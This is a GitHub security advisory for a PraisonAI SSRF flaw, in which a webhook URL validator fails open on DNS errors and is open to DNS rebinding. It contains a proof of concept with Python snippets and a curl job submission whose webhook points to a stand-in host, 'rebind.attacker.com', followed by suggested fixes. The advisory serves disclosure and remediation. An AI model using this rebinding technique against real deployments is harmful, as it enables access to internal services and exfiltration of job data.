# [H] PraisonAI: Webhook SSRF via DNS fail-open in `JobSubmitRequest.validate_webhook_url()` — bypass of CVE-2026-40114

## Summary
Severity: High
Advisory: GHSA-rg5q-pp8p-f7jm
CVE: CVE-2026-55537
CWE: CWE-367, CWE-705, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-rg5q-pp8p-f7jm
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.6.58

## Details
### Summary

`praisonai/jobs/models.py::JobSubmitRequest.validate_webhook_url()` validates webhook
URLs by resolving the hostname and checking whether the IP is private. When DNS
resolution fails (`socket.gaierror`), the validator **silently passes** the URL via
`except socket.gaierror: pass`. Additionally, even when DNS succeeds at validation time,
the webhook is fired much later by `JobExecutor._send_webhook()`, which calls
`httpx.AsyncClient().post(job.webhook_url)` — performing a **fresh, independent DNS
lookup** at execution time. Together, these flaws create a TOCTOU SSRF window.

An attacker can:
1. Submit a job with `webhook_url` pointing to a hostname that currently does not
   resolve (NXDOMAIN) → validation passes (`gaierror` → `pass`)
2. Update DNS to point that hostname to `127.0.0.1` or another private IP
3. When the job completes, `_send_webhook()` resolves the hostname fresh → POST sent
   to the internal IP

### Details

**Flaw 1 — Fail-open on DNS error (`jobs/models.py` lines 58-66):**

```python
@field_validator("webhook_url")
@classmethod
def validate_webhook_url(cls, v):
    ...
    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            raise ValueError("Webhook URL resolves to private network address")
    except socket.gaierror:
        pass    # <-- FAIL-OPEN: DNS failure allows the URL without restriction
    return v
```

When `socket.gethostbyname(hostname)` raises `socket.gaierror` (NXDOMAIN, timeout,
network error during validation), execution flows to `pass` and the URL is accepted.

**Flaw 2 — Fresh DNS at execution time (`jobs/executor.py` lines 376-406):**

```python
async def _send_webhook(self, job: Job):
    async with httpx.AsyncClient(timeout=30.0) as client:
        response = await client.post(
            job.webhook_url,      # <-- fresh DNS resolution here, not cached from validation
            json=payload,
            ...
        )
```

`httpx.AsyncClient` creates a new connection per call. DNS is resolved at execution time,
completely independent of the validation-time resolution. The gap between submission
and execution can be minutes to hours (depending on job queue depth and timeout settings).

**Combined TOCTOU window:**

```
T=0   Attacker submits: webhook_url = "http://rebind.attacker.com/cb"
      Validation:  socket.gethostbyname("rebind.attacker.com") → gaierror (NXDOMAIN)
      Result:      except socket.gaierror: pass  → ACCEPTED

T=5   Attacker updates DNS: rebind.attacker.com A → 127.0.0.1 (TTL=60)

T=60  Job completes. _send_webhook() fires:
      httpx.post("http://rebind.attacker.com/cb")
      DNS: rebind.attacker.com → 127.0.0.1
      POST reaches 127.0.0.1 → SSRF
```

**Relation to CVE-2026-40114 / GHSA-8frj-8q3m-xhgm:** That CVE covered "no URL
validation at all" on the webhook_url parameter, patched in v4.5.126 by adding
`validate_webhook_url()` to `jobs/models.py`. This finding targets the **validation code
itself** — the `except socket.gaierror: pass` fail-open introduced in that patch.
CVE-2026-40114: no validation. This bypass: validation present but fail-open on DNS error.

### PoC

**Requirements:** A domain you control with configurable DNS TTL, access to the jobs API

**Step 1 — Confirm fail-open behaviour (local code verification):**

```python
from praisonai.jobs.models import JobSubmitRequest
from unittest.mock import patch
import socket

# Simulate: hostname temporarily does not resolve
with patch("socket.gethostbyname", side_effect=socket.gaierror("NXDOMAIN")):
    req = JobSubmitRequest(
        prompt="hello",
        webhook_url="http://rebind.attacker.com/callback"
    )
    # No exception raised — URL accepted despite NXDOMAIN
    print("Webhook accepted:", req.webhook_url)
```

Expected: `Webhook accepted: http://rebind.attacker.com/callback`

**Step 2 — Confirm fresh DNS at execution time:**

```python
# From jobs/executor.py _send_webhook():
# httpx.AsyncClient creates a new TCP connection (no DNS cache sharing with validator)
# Standard httpx behaviour: each .post() resolves DNS independently

import httpx, asyncio

async def demo():
    # httpx resolves DNS here, not using any cached result from validation
    async with httpx.AsyncClient() as client:
        # This call resolves "rebind.attacker.com" fresh at runtime
        # If DNS changed since validation, it hits the new IP
        try:
            r = await client.post("http://rebind.attacker.com/callback", json={})
        except Exception as e:
            print(f"Connection: {e}")

asyncio.run(demo())
```

**Step 3 — Full attack scenario:**

```bash
# 1. Set up domain with short TTL, currently returning NXDOMAIN
#    rebind.attacker.com  →  (no record, TTL=60)

# 2. Submit job via API
curl -X POST http://praisonai-server:8000/jobs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "prompt": "Calculate 2+2",
    "webhook_url": "http://rebind.attacker.com/callback"
  }'
# Response: {"job_id": "job_abc123", "status": "queued", ...}

# 3. After 5 seconds (before job finishes), add DNS record:
#    rebind.attacker.com  A  127.0.0.1  TTL=60

# 4. Wait for job to complete (seconds to minutes).
#    _send_webhook() fires and resolves rebind.attacker.com → 127.0.0.1
#    POST request hits 127.0.0.1 (internal service)

# If 127.0.0.1:80 is running a service, it receives:
# POST /callback HTTP/1.1
# Content-Type: application/json
# {"job_id": "job_abc123", "status": "succeeded", "result": "4", ...}
```

**Immediate variant (no DNS timing required):**

If DNS resolution fails transiently (rate limit, network blip, temporary outage)
during validation, the webhook is accepted unconditionally even for a URL that would
normally resolve to a private IP. No attacker control over DNS timing is required —
the attacker simply retries submission during moments when their DNS server is unreachable
(e.g., their DNS server is down, causing `gaierror`).

### Impact

**What kind of vulnerability:** Server-Side Request Forgery via TOCTOU DNS rebinding
and validation fail-open.

**Who is impacted:** Any deployment exposing the PraisonAI Jobs API (`POST /jobs`) to
external or lower-trusted callers. This includes:

- **Multi-tenant deployments** where workspace members submit jobs
- **API integrations** (n8n, Zapier-style workflows) that provide `webhook_url` fields

**Post-exploit capabilities:**
- HTTP POST to any internal service with JSON payload (job result data)
- If an internal service interprets the POST body as commands (Jenkins webhook,
  Consul KV, etc.), this achieves code execution on internal infrastructure
- Exfiltration of job results (which may include agent reasoning, data retrieved
  during the task, discovered credentials) to an attacker-controlled endpoint
```

---

## Remediation Suggestion (for maintainers)

**Fix 1 — Change `gaierror` handler to fail-closed (`jobs/models.py` line 63):**

```python
# VULNERABLE
except socket.gaierror:
    pass

# FIXED
except socket.gaierror:
    raise ValueError(
        "Webhook URL hostname could not be resolved. "
        "Ensure the hostname is valid and publicly reachable."
    )
```

**Fix 2 — Re-validate at execution time (`jobs/executor.py` before `_send_webhook`):**

```python
async def _send_webhook(self, job: Job):
    if not job.webhook_url:
        return
    # Re-validate to prevent DNS rebinding
    try:
        from urllib.parse import urlparse
        import socket, ipaddress
        hostname = urlparse(job.webhook_url).hostname
        ip = socket.gethostbyname(hostname)
        if ipaddress.ip_address(ip).is_private:
            logger.warning(f"Webhook SSRF blocked at execution time: {job.webhook_url}")
            return
    except Exception as e:
        logger.warning(f"Webhook validation failed at execution: {e}")
        return
    # ... proceed with httpx.post
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-rg5q-pp8p-f7jm
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
